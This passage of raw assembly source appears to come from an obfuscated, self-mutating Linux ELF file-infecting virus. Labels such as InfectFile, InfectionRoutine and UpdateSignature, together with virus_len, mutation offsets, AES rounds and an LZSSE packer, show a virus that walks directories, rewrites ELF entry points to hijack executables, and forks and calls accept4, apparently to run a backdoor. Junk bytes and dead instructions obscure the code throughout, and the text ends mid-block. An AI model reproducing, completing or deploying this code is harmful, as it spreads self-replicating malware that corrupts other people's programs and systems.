    cmp         r2, 0
    je          ..@q33n7vJ6zgaJ
    mjmp        ..@otl5TiiiihCQ
db 0xc1, 0xcd
..@otl5TiiiihCQ:
    mjmp        ..@9Ww5SU4Xx85f
..@iv1rpKzHQEGO:
    ret
    mjmp        ..@1SdyWudny4wf
..@MnyqvWAhC2o6:
%ifdef X86_64
    mov         edx, DWORD [rdi]
%endif
    mjmp        ..@wPozKXuHPmLC
..@s6Tw5HIb0wUV:
    mov         dx, WORD [rdi+4]
    mjmp        ..@vY8PiwSPFQQ1
..@vGEwe4sX5YYq:
    ret
    mjmp        ..@AQacoiwffrv4
..@fCFvdZKTbils:
    movr        rax, rax
    mjmp        ..@TThCmphP1uKc
UpdateSignature:
    mjmp        ..@cdHSTdBvVOwo
..@wPozKXuHPmLC:
%ifdef X86_64
    and         edx, 0fffff8ffh
    cmp         edx, 0000b841h
%endif
    mjmp        ..@9V5DbaVvLUmG
..@xc666BDBZIbn:
    movr        rax, rax
    mjmp        ..@TwFmboXisgik
..@AQacoiwffrv4:
    pop         rcx
    xchg        rsi, rsi
    mjmp        ..@7gGC33l1o6uo
db 0x63
..@7gGC33l1o6uo:
    mjmp        ..@rIMuzip1SROE
db 0x3f
..@rIMuzip1SROE:
    mjmp        ..@OsObwRKvDOpz
db 0x98, 0xec
..@OsObwRKvDOpz:
    mjmp        ..@xmY2I4rRUR3J
..@Fn8A6HuhtUpf:
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2, QWORD [r1+e_h.e_entry]
    movr        rbx, rbx
    movr        rsi, rsi
    push        rsi
    mjmp        ..@rCan4chxKMQ9
..@ebCZjAxfY75g:
    push        rbx
    pop         rbx
    cmp         DWORD [rdi+6], 90909090h
    jne         ..@D6NbMNOj03aJ
    xor         rcx, rcx
    mjmp        ..@r4XZc7kEiunR
..@W7jB9Naz3vmF:
    add         rsp, _DYNPIE_OFF_size
    xchg        rcx, rcx
    pop         r2
    pop         r3
    mjmp        ..@3bJxEaMVECK3
db 0xc1
..@3bJxEaMVECK3:
    mjmp        ..@hlKmn7SJF9SO
..@us3AyZqBlRCh:
    movr        rcx, rcx
    mjmp        ..@WtaxElAeCrOy
..@ZPXTSBE9sZen:
%ifdef X86_64
    mov         r8d, DWORD [r8+file.filefd]
%endif
    mjmp        ..@nEQm2LuzrIlS
db 0xfb, 0xe7
..@nEQm2LuzrIlS:
    mjmp        ..@F2GEOgp2VOi7
..@pco5vtSSx6ta:
%ifdef X86_64
    movv        rbx, 90008900h
%endif
    mjmp        ..@DDEo0sjLZIP0
..@MbZrZGUgLg5V:
    xchg        rax, rax
    mjmp        ..@7PBBmse1hDpS
db 0xac
..@7PBBmse1hDpS:
    mjmp        ..@aQmqhdd0FclQ
db 0x06, 0xb3
..@aQmqhdd0FclQ:
    mjmp        ..@JZHSJ76IoI8E
db 0x02
..@JZHSJ76IoI8E:
    mjmp        ..@M8XOSaiDAPWx
..@BbU704ija62c:
    jnz         ..@icuKMk8rToL9
    mjmp        ..@ayo1OvDshQp6
db 0x96
..@ayo1OvDshQp6:
    mjmp        ..@YXZqwdb3vJ9m
..@Rb2crAtRUSTN:
    xor         rcx, rcx
    mov         rsi, QWORD [rsp+bytes]
    mjmp        ..@eww8SL8tw8Ul
..@5oODc3JjRSqI:
    setz        cl
    mjmp        ..@J2I5Sg6EsBI2
db 0xdf, 0xf0, 0x3c
..@J2I5Sg6EsBI2:
    mjmp        ..@rG4kxALxWA8u
db 0x39, 0x26
..@rG4kxALxWA8u:
    mjmp        ..@M1nxlq5cSE6a
..@RxrJFwe4UuFk:
    mov         r5, [rsp]
    mov         DWORD [r5+file.filefd], eax
    xor         r1, r1
    xor         r2, r2
    movr        rbx, rbx
    mjmp        ..@qSTzJYxchAnk
..@orP7xq28KtkM:
    xor         rax, rax
    mjmp        ..@2ydIdc3fhVwV
..@x0yhAqNz6cFz:
%ifdef X86_64
    shr         rax, 8
%endif
    mjmp        ..@QA0DEGjEdKDh
db 0xe4, 0x25, 0x12
..@QA0DEGjEdKDh:
    mjmp        ..@Mj0DOIpTk90b
db 0xd2, 0x27
..@Mj0DOIpTk90b:
    mjmp        ..@MlapGylo4980
..@QGgjs47imPBM:
    movv        rax, 1
    ret
    mjmp        ..@ip2AIYBXh0zB
db 0xd7
..@ip2AIYBXh0zB:
    mjmp        Strcpy
..@aHG1WgkR10o9:
    pop         rsi
    movv        rax, (-1)
    push        rsi
    pop         rsi
    ret
    mjmp        ..@1dOUGBRflkfm
db 0x9c, 0x9c
..@1dOUGBRflkfm:
    mjmp        ConvertPushPopValueToMoveValue
..@esYlxBDW5YrD:
    add         r4, 1
    mjmp        ..@wfzfLiOfxAwj
..@ZQpMbFpmSBnb:
    add         rdi, key-_start
    lea         rsi, [rsp+_PAYLOAD_OFF.key]
    movv        rcx, 0x8
    rep         movsd
    xor         rax, rax
    mjmp        ..@B9RW6EK2OJrq
db 0x6d, 0xd6
..@B9RW6EK2OJrq:
    mjmp        ..@LPfIzDVpBxV7
db 0x03
..@LPfIzDVpBxV7:
    mjmp        ..@QzsuS1mO3iVo
..@vpw9TiD10ZZN:
    je          ..@lYPJ3SUxIR6l
    rep         nop
    mjmp        ..@icuKMk8rToL9
    push        rsi
    mjmp        ..@x6dJZEK3pRS9
db 0xcc
..@x6dJZEK3pRS9:
    mjmp        ..@1Fkwk0rEyOab
..@8gybIGIgWAYM:
    pop         rbx
    xchg        rsi, rsi
    rep         nop
    mjmp        ..@mis7ttdi3vlx
..@w2x7ndkf3HmP:
    pop         rsi
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    mov         QWORD [rdi], rsi
    xor         rcx, rcx
    mov         rdi, m6
    mjmp        ..@H964QAcKznoy
db 0xe7, 0xc3
..@H964QAcKznoy:
    mjmp        ..@9CugxZaEsyUg
db 0xd0, 0x17, 0xa5
..@9CugxZaEsyUg:
    mjmp        ..@ZQpMbFpmSBnb
..@7adcy1yzcrXh:
%ifdef X86_64
    jz          ..@DFG1TGpUY8Ni
%endif
    mjmp        ..@N05lctUwqG1q
InfectFile:
    mjmp        ..@uVUUroZqoYlr
..@SjTc2W5AFs2G:
    movr        rax, rax
    mjmp        ..@zL4lNlVelyLd
db 0x27, 0xc3, 0xf3
..@zL4lNlVelyLd:
    mjmp        ..@nERFWm0Zi7WT
..@yt0s9e630oXW:
    jz          ..@Tcqv47H00Ft7
    mjmp        ..@H2uE4kBVrOIf
db 0xa1, 0x10
..@H2uE4kBVrOIf:
    mjmp        ..@i9ckTbEmEDbY
..@MLTT4Na0pY6W:
    movr        rbp, rbp
    mjmp        ..@6hhZ8JjEr3v0
db 0xfe, 0xe6, 0x4a
..@6hhZ8JjEr3v0:
    mjmp        ..@PkRWtQKNxlfU
..@pKkCD96nFQNM:
    xor         rbx, rbx
    mjmp        ..@V7JMhla4qHQl
..@65CRAg534K3K:
%ifndef ENABLE_DEBUGGING
    movr        rbx, rbx
%endif
    mjmp        InfectionRoutine
..@XUvyZ9T3gvQR:
    push        rax
    mjmp        ..@7GKsKDuzFaM7
db 0xc7
..@7GKsKDuzFaM7:
    mjmp        ..@6Z4mDBHeqcu2
..@iRGbw3ElFmWI:
    push        rdx
    mjmp        ..@MDFfZfoaAInJ
..@eJLWI2KmLXAP:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
    movv        rax, SYS_ACCEPT4
    syscall
%endif
    mjmp        ..@KQj7emTX3SuW
..@hjd5vvI6czmS:
    movdqu      xmm1, oWORD [rsp+0x90]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xa0]
    aesenc      xmm0, xmm1
    mjmp        ..@B06RfRdhjZJr
..@yrXNrUsePR5Q:
%ifdef X86_32
    mov         WORD [esi+ecx], bx
%endif
    mjmp        ..@xisUSQS51Psy
..@WxGYU8BCZDk3:
    push        r5
    mjmp        ..@AWoxcKvuE1sK
..@lymNxZn8ZsaD:
    aesenc      xmm0, xmm1
    xchg        rcx, rcx
    mjmp        ..@JBu1iCqmuc7q
..@IAIT3XG2lF1O:
    xor         r4, r4
    mjmp        ..@Hie52RojKhuU
..@hhTjAgCCuLjx:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    mjmp        ..@rLFgy5jEhpP9
db 0x91, 0xf2
..@rLFgy5jEhpP9:
    mjmp        ..@Tg041Lak8hRl
db 0xc6
..@Tg041Lak8hRl:
    mjmp        ..@79RNslnZRGGb
..@JVbSUAg7SWTd:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    mjmp        ..@jVfzE3wUg6rD
db 0x02, 0xc1, 0x6b
..@jVfzE3wUg6rD:
    mjmp        ..@wVdD51lOUKoy
..@J7JuhFVzzaBC:
    movr        r3, r4
    mjmp        ..@MPu4ZZm3uWUJ
db 0x1e, 0x08, 0xfe
..@MPu4ZZm3uWUJ:
    mjmp        ..@VbUM2mlrINsM
db 0xd3, 0x67, 0xf5
..@VbUM2mlrINsM:
    mjmp        ..@sv9usWZqHVXy
..@4imKy6Gfnrii:
    movdqu      xmm1, oWORD [rsp+0xc0]
    mjmp        ..@6gKBHcZnKlZV
db 0xa8
..@6gKBHcZnKlZV:
    mjmp        ..@M601biY06kvR
db 0xc0, 0x2c, 0xee
..@M601biY06kvR:
    mjmp        ..@DP8mARWhuxA5
db 0x32
..@DP8mARWhuxA5:
    mjmp        ..@lymNxZn8ZsaD
..@l0e3DvVuYNCu:
    xor         rax, rax
    ret
    mjmp        ..@wuHn3AqjjaXh
db 0xdb, 0x9b, 0x18
..@wuHn3AqjjaXh:
    mjmp        NonBinaryFile
..@7P7QGBNRJhZk:
    pop         r5
    push        rcx
    mjmp        ..@xc666BDBZIbn
..@xFkZlNTaOQyW:
%ifdef X86_64
    xchg        rsp, rsp
%endif
    mjmp        ..@DiakdkySUNK2
..@47MUF87gyVLr:
    mov         bx, WORD [rsp+_LZSSE_OFF.la_index]
    mjmp        ..@Gi3V1LGJQlwg
..@qqCy6NANM6FQ:
    rep         movsb
    mjmp        ..@iKLZcLHbpa56
db 0x63, 0x47
..@iKLZcLHbpa56:
    mjmp        ..@DSBsVGfL7rHD
..@sRaiMLr98ax1:
    movr        rdi, rdi
    mjmp        ..@v6sio4rqiiYg
WORDToDWORDASCII:
    mjmp        ..@gISPNvXMJLaS
..@9u3iuU6oQ0L5:
    push        rbx
    pop         rbx
    cmp         r1, 0x00
    je          ..@VS1Sy4nfkuW1
    movv        rax, SYS_FORK
    mjmp        ..@FtOpVYPEsRoE
db 0xed, 0x15
..@FtOpVYPEsRoE:
    mjmp        ..@nQQCUGWVhD96
..@LTPlTXlpiPAd:
    cmp         BYTE [rdi+rcx], 90h
    je          ..@g7X5LjzImBoh
    movr        rcx, rcx
    mov         DWORD [rsp+_MUTA_OFF.index], ecx
    jne         ..@8NT25Nz9sx0t
    mjmp        ..@meDYXHTqiqbB
..@evKRr3lgBiUD:
    xor         rcx, rcx
    mjmp        ..@qHEAPfiHChlO
..@rbyi2KI3vyZ4:
    pop         rcx
    xor         r2, r2
    mov         r2w, WORD [r1+e_h.e_phnum]
    mjmp        ..@hXCm0EoGTqKC
..@Pz4GkNP7AuSw:
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    jz          ..@uOZ2G0ze9eph
    mjmp        ..@OBhAYKXYuR7u
..@D8L8TSWQvqZl:
    rep movsb 
    mjmp        ..@A4hSHY1HijWU
db 0x34, 0x44, 0x63
..@A4hSHY1HijWU:
    mjmp        ..@hzYLMD2OT7g7
db 0x34, 0x94, 0xa6
..@hzYLMD2OT7g7:
    mjmp        ..@7P7QGBNRJhZk
..@zx0pmIqNko2m:
    xchg        rbx, rbx
    mjmp        ..@8NPIy7Ly2Mno
..@Tc35KovETxqS:
    pop         rdx
    add         rdi, rcx
    push        rbx
    pop         rbx
    mjmp        ..@2Up85mrKJZUC
db 0x14, 0xa6, 0x28
..@2Up85mrKJZUC:
    mjmp        ..@f0OUrBnLq8h6
db 0xe3, 0x40
..@f0OUrBnLq8h6:
    mjmp        ..@O5DGDhHhBwtv
..@34beGWNyC9UD:
    je          ..@0FdhCmQYWHuS
    mjmp        ..@rubDZn13d7Mu
db 0xd0
..@rubDZn13d7Mu:
    mjmp        ..@RN8l4QSYUJDU
db 0xc7, 0x17, 0xdf
..@RN8l4QSYUJDU:
    mjmp        ..@4Qw1xXrb7oHE
..@m60VBpZIIT25:
    mov         rdi, QWORD [r5+file.fileptr]
    movv        rax, 0x0
    mjmp        ..@9obC045FRF7g
db 0x20
..@9obC045FRF7g:
    mjmp        ..@yoEc9pfUqHXP
db 0xe1, 0xe1, 0xb6
..@yoEc9pfUqHXP:
    mjmp        ..@omM4zcYWEfVW
..@tTigU9uPJbPQ:
    xor         rax, rax
    mjmp        ..@XdDadk3E4Yoc
db 0xd9
..@XdDadk3E4Yoc:
    mjmp        ..@1ccTqLchpJOJ
..@3QzTNnlDPZGI:
%ifdef X86_64
    or          ebx, edx
%endif
    mjmp        ..@QikMnbu0o9mm
..@aLzAiQMLKdua:
    xor         r4, r4
    mjmp        ..@7D1bCxnK0nZj
..@QLKiQ6dSRReX:
%ifndef ENABLE_DEBUGGING
    movv        rax, SYS_PRCTL
    xor         r3, r3
%endif
    mjmp        ..@NM97v2oonjEV
db 0x39, 0x2a
..@NM97v2oonjEV:
    mjmp        ..@pDD3AuvpLlRR
db 0xfc, 0x14
..@pDD3AuvpLlRR:
    mjmp        ..@N2QGhKdnRdHe
..@zRbMMMTlgL0S:
%ifdef X86_64
    mov         DWORD [rsi+rcx], ebx
%endif
    mjmp        ..@YLF9t7krXFfG
db 0x0c, 0xe7, 0x4a
..@YLF9t7krXFfG:
    mjmp        ..@VUWfMFLusvnB
..@Gb259VSFOwSd:
    movr        rsp, rsp
    shl         edx, POSITION_BITS+LENGTH_BITS
    mov         bx, WORD [rsp+_LZSSE_OFF.match_pos]
    shl         ebx, LENGTH_BITS
    or          bx, ax
    mjmp        ..@DmpdPNNroHRm
db 0x63, 0x2a, 0x23
..@DmpdPNNroHRm:
    mjmp        ..@Tc8tIxV9F9JB
..@MnWNmWimmPdO:
    mov         rsi, QWORD [rsp+_MUTA_OFF.start]
    mov         ecx, DWORD [rsp+_MUTA_OFF.index]
    movv        rax, 0xff
    movr        rbx, rbx
    mjmp        ..@Pz4GkNP7AuSw
..@zD1zf2jHnMnl:
    movr        r1, rsp
    mjmp        ..@3L5b4wk63CTe
db 0x32, 0xa2, 0xf3
..@3L5b4wk63CTe:
    mjmp        ..@PaOXqmA2CYjU
db 0x37
..@PaOXqmA2CYjU:
    mjmp        ..@httD9Iv1q2kD
..@a6ywayvwy1W5:
    and         bx, 00f8h
    mjmp        ..@YHuwOasrXDbn
db 0x6d
..@YHuwOasrXDbn:
    mjmp        ..@3oE9FkBLo5HP
..@wfzfLiOfxAwj:
    xchg        rax, rax
    mjmp        ..@bxhuTVVmpM0W
db 0x1b, 0xd2, 0x01
..@bxhuTVVmpM0W:
    mjmp        ..@cGwXycecTBNQ
..@B4Xe14l5pjOY:
    movv        rax, 0x20
    xchg        rsi, rsi
    mjmp        ..@hctv5Cq6aFxH
..@SK7oUyBUIqWH:
    shr         edx, 8
    mjmp        ..@2vuqv7Cd4GBf
db 0xb3, 0x07, 0x1f
..@2vuqv7Cd4GBf:
    mjmp        ..@4GAAqCcyRmwg
db 0xac
..@4GAAqCcyRmwg:
    mjmp        ..@u9v9NLTsJXNO
..@JCOWnh0b32hy:
    push        r3
    movr        r1, r4
    xchg        rsi, rsi
    movr        rbx, rbx
    mjmp        ..@lZYuZbXWGxiB
..@ewIBOtFG4Sbl:
%ifdef X86_64
    mjmp        ..@VCbyXD9BXQQO
%endif
    mjmp        ..@nfLKHei2HGqE
db 0x0b
..@nfLKHei2HGqE:
    mjmp        ..@OhWKvDvjmNNc
db 0xa9, 0x3f, 0x9e
..@OhWKvDvjmNNc:
    mjmp        ..@k3tzSSBQTNbC
..@tLQ0Zg2xjPLl:
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    mjmp        ..@h6ybgaZZf3NS
..@FXRT5ntb0yJ6:
    mov         bl, dl
    mjmp        ..@0d7ccYkojynq
..@AouebfNACuCK:
    ret
    mjmp        ..@qFi7WwPR1QRb
db 0x37
..@qFi7WwPR1QRb:
    mjmp        AddSizeMappedFile
..@FFWhQHEorskh:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], rsi
    mjmp        ..@xuLozzY5Nmb7
db 0xa5
..@xuLozzY5Nmb7:
    mjmp        ..@JOxjQ2VElu5N
db 0x43, 0xb3, 0xa0
..@JOxjQ2VElu5N:
    mjmp        ..@PvQheFtgWC8h
..@GQBnsP1qtjy4:
    mjmp        ..@mK5XDdpvHJaA
    mjmp        ..@XOXywL7ZV5X6
db 0x29
..@XOXywL7ZV5X6:
    mjmp        ..@JLNTWtABwL3C
..@bTzgExjMldyM:
    push        r4
    mjmp        ..@GMXSGhknTWwR
..@CN8GaW7Di6em:
    push        rbx
    mjmp        ..@rZ3eWsn0eHab
db 0x2c
..@rZ3eWsn0eHab:
    mjmp        ..@6TeKCmAw3bAA
..@EE5eFOi2o8CG:
    movr        r1, rax
    mjmp        ..@ZHrx1zDECIsR
..@JJ3yXTnx64LG:
    push        rsi
    pop         rsi
    jne         ..@AQacoiwffrv4
    xor         rsi, rsi
    mov         esi, DWORD [rdi]
    mjmp        ..@osLO1Tm1CyBe
db 0xcb, 0x6d
..@osLO1Tm1CyBe:
    mjmp        ..@Jvedv2rHVSDb
..@72EkkP44GUjL:
    not         ebx
    mjmp        ..@sYn8QPDrXSh0
db 0x37
..@sYn8QPDrXSh0:
    mjmp        ..@Zl2YqFv0MPQ1
..@VJ597LCJTYV0:
%ifdef X86_64
    movv        rax, 0x0000900000000000
%endif
    mjmp        ..@NLMPXuC2BFAI
..@PBvDehCPTyj8:
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    add         r4, rax
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    jl          ..@mpUD3imx8Xju
    mjmp        ..@hhTjAgCCuLjx
    mjmp        ..@5YI8VQKtr0HY
..@4Kxe7XPxGFJv:
    movr        rax, rax
    mjmp        ..@BfvhzvWylMhW
db 0x24, 0xae, 0x66
..@BfvhzvWylMhW:
    mjmp        ..@hjd5vvI6czmS
..@i7RR5N7SgEQp:
%ifdef X86_64
    cmp         edx, 90c08948h
%endif
    mjmp        ..@QcJOCFcNKzQG
..@Dwuz2wpZJYjP:
%ifndef ENABLE_DEBUGGING
    syscall
    movv        rax, SYS_FORK
    syscall
    test        eax, eax
%endif
    mjmp        ..@k0whmedk6Rkb
db 0xac, 0x96
..@k0whmedk6Rkb:
    mjmp        ..@KgOUcwcvDmAD
..@pS31SwL5krNl:
    mul         r2
    mjmp        ..@e7IN8MXFcsv3
..@9ilmucMkinhl:
%ifdef X86_64
    jne         ..@jxQypQEcefs8
%endif
    mjmp        ..@2zK3voWoLcD3
..@yPoG9c7nARFD:
    ret
    mjmp        ..@hsZfLgzJvN3O
db 0x64, 0x07, 0x61
..@hsZfLgzJvN3O:
    mjmp        WORDToDWORDASCII
..@oE8RsCf0y6Vv:
    mov         edx, DWORD [rdi]
    mjmp        ..@tttp4OfxCsYQ
db 0x2a, 0xc5
..@tttp4OfxCsYQ:
    mjmp        ..@A0qASmADG2qb
..@xMWcStweHmqt:
    mov         QWORD [r5+file.fileptr], 0x00
    mjmp        ..@eYMT2uuEOLgk
..@w9gPbgK0ngH4:
%ifdef X86_64
    and         edx, 00f8fffah
    movr        rax, rax
%endif
    mjmp        ..@Gjg1YPVfSLaK
db 0x04, 0x1e
..@Gjg1YPVfSLaK:
    mjmp        ..@vLQox32C0inV
db 0xb7, 0xec, 0xa2
..@vLQox32C0inV:
    mjmp        ..@74EHL1aEuXP7
..@iiucT6lvJxmW:
    add         rdi, non_packed_len
    mov         m7, rdi
    add         m7, rax
    mov         rdi, m6
    add         rdi, virus_len-_start
    mjmp        ..@3VX3i4ksqyvA
IsELFComplete:
    mjmp        ..@WxGYU8BCZDk3
..@x3CDjJi9cZLx:
%ifdef X86_64
    rep         nop
    and         bx, 111b
%endif
    mjmp        ..@ewIBOtFG4Sbl
..@9UXcK0HOsLv8:
    add         rbx, rdx
    mjmp        ..@xxRiOeDPnWLL
..@vJ1MUdI71B8n:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
    push        rax
    pop         rax
    rep         nop
%endif
    mjmp        ..@wyu2SgMNYK8t
db 0x28
..@wyu2SgMNYK8t:
    mjmp        ..@fCNHzZHBfQFD
db 0x0a, 0xc0
..@fCNHzZHBfQFD:
    mjmp        ..@eJLWI2KmLXAP
..@cGwXycecTBNQ:
    mjmp        ..@FDwDLUHtnG4U
    mjmp        ..@0m0TE6DZCj0l
db 0x16, 0xcc
..@0m0TE6DZCj0l:
    mjmp        ..@MavS6kf0Pdgi
..@sogLmENhRgfS:
    movr        rdi, rsi
    mjmp        ..@LjFxNzeGfzCF
db 0xf0, 0x14, 0xa0
..@LjFxNzeGfzCF:
    mjmp        ..@NhKlmNtNTX5E
..@oHmNeLM4DeYW:
    movv        rax, 0x10
    and         al, BYTE [rsp+_MUTA_OFF.random_BYTE]
    test        al, al
    jz          ..@xdTAIzeOlYSz
    mjmp        ..@DkNT9VqymcJQ
..@GeGhGLR2FXOp:
    mjmp        ..@XLE9hbhAKGdP
    mjmp        ..@ktzJDLKso4Zi
db 0x96, 0x25
..@ktzJDLKso4Zi:
    mjmp        ..@lEtRX1HKgmPt
db 0x6d
..@lEtRX1HKgmPt:
    mjmp        ..@0FdhCmQYWHuS
..@JnAgTGhPCQW6:
    je          ..@amSjgXHWBguE
    mjmp        ..@TdFNA7yMwyBH
..@M1QjwHku3IuK:
    ret
    mjmp        ..@NjlpBo6Il35a
..@eIhuUBvedg8F:
    jz          ..@9uOkaWycDHHq
    mjmp        ..@a6iOm1tqeK5l
db 0xf5
..@a6iOm1tqeK5l:
    mjmp        ..@1jLhdnICkCC7
..@FLl3I5gubKP4:
    movv        r2, signature_len
    call        AddSizeMappedFile
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    mjmp        ..@WxTyGMPaTfyk
..@rAzq48m3K8QZ:
    xor         rdi, rdi
    mjmp        ..@sZ1TEkmW7nKu
..@HB74ItqHNum7:
    or          ebx, ecx
    mjmp        ..@WO7JAkV3uLTf
db 0x42, 0x47
..@WO7JAkV3uLTf:
    mjmp        ..@PKuHoBU4Auig
..@WtorU1I7Hyzk:
    xchg        rdx, rdx
    mjmp        ..@9uOkaWycDHHq
..@GNjE2A2v5nxL:
%ifdef X86_32
    shr         edx, 11
%endif
    mjmp        ..@epg8gkziJgLa
db 0xae, 0x34, 0x99
..@epg8gkziJgLa:
    mjmp        ..@j7vLHnnq7a5k
db 0x67
..@j7vLHnnq7a5k:
    mjmp        ..@T8MxZqTUry6l
..@I9CoU0DMC6F5:
    mov         r3, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    mjmp        ..@Vf8dVMOzI9My
db 0x06, 0x38, 0xde
..@Vf8dVMOzI9My:
    mjmp        ..@x4QKQb3WgUYO
..@SINSKJO3d8sJ:
%ifdef X86_64
    push        rdi
    pop         rdi
%endif
    mjmp        ..@XTjqfEcKccQ0
db 0x2c
..@XTjqfEcKccQ0:
    mjmp        ..@xmC5gxdD2nfc
..@RyJqQ98kAtgu:
    jz          ..@B1o4WTKPHMfV
    mjmp        ..@jlUBzak3sN3H
..@dWQhEmc0rEtc:
%ifdef X86_32
    shr         ebx, 8
%endif
    mjmp        ..@JzFcIyNGQMPW
..@Qu1ZaZ78lCsg:
%ifdef X86_64
    pop         rax
    movv        rdx, 48h
    cmp         al, 41h
    jne         ..@MlapGylo4980
%endif
    mjmp        ..@WyycQ9vBFtfJ
db 0x4d
..@WyycQ9vBFtfJ:
    mjmp        ..@pGFGvmYcVVOv
..@uDsoD2E5Ytb3:
    push        rdi
    mjmp        ..@3vrcryQWWAVZ
..@xibepByllQdf:
    ret
    mjmp        ConvertMoveZeroToXor
..@SVQWd58t6PXz:
    shr         dx, 0x4
    add         ecx, 1
    cmp         cl, 0x4
    jl          ..@KwjQNfrfAfJw
    pop         rax
    mjmp        ..@GPHpQCx4ah89
db 0x3a, 0x0a, 0xed
..@GPHpQCx4ah89:
    mjmp        ..@t1LercbH82nj
..@ogWcIYrxDY2J:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
%endif
    mjmp        ..@5MXB8Vw6EgMl
db 0xaf, 0xd4, 0xd6
..@5MXB8Vw6EgMl:
    mjmp        ..@pfkAgR9zjwlf
..@kX7KCoXZwH2W:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    mjmp        ..@qbyVhYHQJRO0
db 0x2c
..@qbyVhYHQJRO0:
    mjmp        ..@11AvdFUOxNae
db 0xab, 0xa0
..@11AvdFUOxNae:
    mjmp        ..@UxT1DrIeFIlq
db 0xc4
..@UxT1DrIeFIlq:
    mjmp        ..@vyDfYymmco3R
..@6Z4mDBHeqcu2:
    pop         rax
    cmp         rax, 0
    jne         ..@GkOt1RV7VMVc
    mjmp        ..@iz3utZBO46Lb
..@4esi0t8VLf8g:
    pop         rcx
    pop         rsi
    mjmp        ..@7nlMR16VP7hU
db 0xfe, 0xd4
..@7nlMR16VP7hU:
    mjmp        ..@sRaiMLr98ax1
..@vScslf2gzHHo:
    add         rsp, _INFDIR_OFF_size
    mjmp        ..@7iweBzBGXtC7
db 0x19, 0x2e
..@7iweBzBGXtC7:
    mjmp        ..@4PBfqYFDr23f
db 0x33, 0xa6
..@4PBfqYFDr23f:
    mjmp        ..@12yx4INyixoT
..@ox9BraoJAxAS:
    and         eax, edx
    mjmp        ..@aaWNwsqDJRcS
db 0xfe, 0x08, 0xa3
..@aaWNwsqDJRcS:
    mjmp        ..@sda5mtGEjW1u
..@mnkouL8tniD9:
%ifdef X86_32
    mov         WORD [esi+ecx], bx
%endif
    mjmp        ..@4esi0t8VLf8g
..@O5DGDhHhBwtv:
    add         rsi, rcx
    mjmp        ..@P7V9wpSVHc0t
db 0x22
..@P7V9wpSVHc0t:
    mjmp        ..@GynQl8GsqKpm
db 0x60, 0x08
..@GynQl8GsqKpm:
    mjmp        ..@lZJkTdMxEP0W
..@RDjdKBoMbiNW:
    mjmp        ..@xDSIoQq9ns0Q
    mjmp        ..@GF7N3Na93DnE
..@mo83ob7qhVt4:
    push        r1
    movr        r5, r1
    mjmp        ..@vqFVaczEFcyp
..@ggZDzf07UFTj:
    mov         QWORD [r1+e_h.e_entry], r3
    xchg        rdx, rdx
    or          QWORD [r1+e_h.e_entry], 1b
    push        rcx
    mjmp        ..@VqdTvOGgiqMW
db 0x60
..@VqdTvOGgiqMW:
    mjmp        ..@tyLi3y3Jb2EF
db 0xec, 0xc5
..@tyLi3y3Jb2EF:
    mjmp        ..@DPo93hnTxUDX
..@sFHQIKwsAbER:
    pop         rcx
    movr        rsi, rsi
    pop         rsi
    movv        rax, (-1)
    ret
    mjmp        ConvertMoveValueToPushPopValue
..@dxlZWgeYCHd4:
    ret
    mjmp        ..@88FCnUr1Qozo
db 0xae
..@88FCnUr1Qozo:
    mjmp        ..@5nlYfo15zJr7
..@qAK3v6Bu6sY5:
    push        rbx
    mjmp        ..@8gybIGIgWAYM
..@971YgNTXQiTI:
    xchg        rdx, rdx
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.key_preview-_signature.start+4
    push        rdi
    pop         rdi
    mjmp        ..@eiEIDY3IbmVA
db 0xd7, 0x2c, 0x96
..@eiEIDY3IbmVA:
    mjmp        ..@k7Ay7tR8M16k
db 0xf5, 0xee, 0xf2
..@k7Ay7tR8M16k:
    mjmp        ..@CcP7I5VojWJa
..@Gz59tpsigK83:
    push        rsi
    push        rcx
    mjmp        ..@loZ5jtG10s6D
db 0xe6
..@loZ5jtG10s6D:
    mjmp        ..@6xDTxtMF04Ex
..@viMUcY5up8sN:
    xor         rdi, rdi
    xor         rdx, rdx
    xor         rbx, rbx
    mjmp        ..@akDMlNLv2zFt
db 0x0a
..@akDMlNLv2zFt:
    mjmp        ..@bdIfhcuyXWZQ
..@tjV8wMR7QwjQ:
    movv        rcx, (WINDOW_LENGTH+LOOKAHEAD_LENGTH)
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    mjmp        ..@v34JSQr7em6Q
db 0xae, 0x17, 0xb4
..@v34JSQr7em6Q:
    mjmp        ..@NcdyrZDjIjrE
..@Fsi4HCJTz3UI:
%ifdef X86_64
    je          ..@EuaGjmwM9vTp
%endif
    mjmp        ..@af8RCP8UA0JT
..@YHMaPRgNvXGw:
    jne         ..@tCnVPc3dgM7U
    mjmp        ..@WzXMfN0oZV5B
..@uCkYeg5fgGzj:
    pop         rcx
    mjmp        ..@CDRkctNler19
db 0x9b, 0x1f
..@CDRkctNler19:
    mjmp        ..@bBs81D3ZSi9z
db 0xb7, 0x6f, 0xca
..@bBs81D3ZSi9z:
    mjmp        ..@h49847LyH5Xw
..@N05lctUwqG1q:
%ifdef X86_64
    mov         BYTE [rdi], 41h
%endif
    mjmp        ..@zpDbelG2lJnM
..@rrFgzY9HgQ9L:
    pop         rcx
    mjmp        ..@geIfEUr4P1yF
..@u78sfScGwuLZ:
    CFILE       DWORD [rsp+_KEYGEN_OFF.fd]
    mjmp        ..@ofXYODv7UPud
..@17THnBcZvYog:
    movv        r4, 0x1
    mjmp        ..@orP7xq28KtkM
..@rmRtX6TIne4Z:
%ifdef X86_64
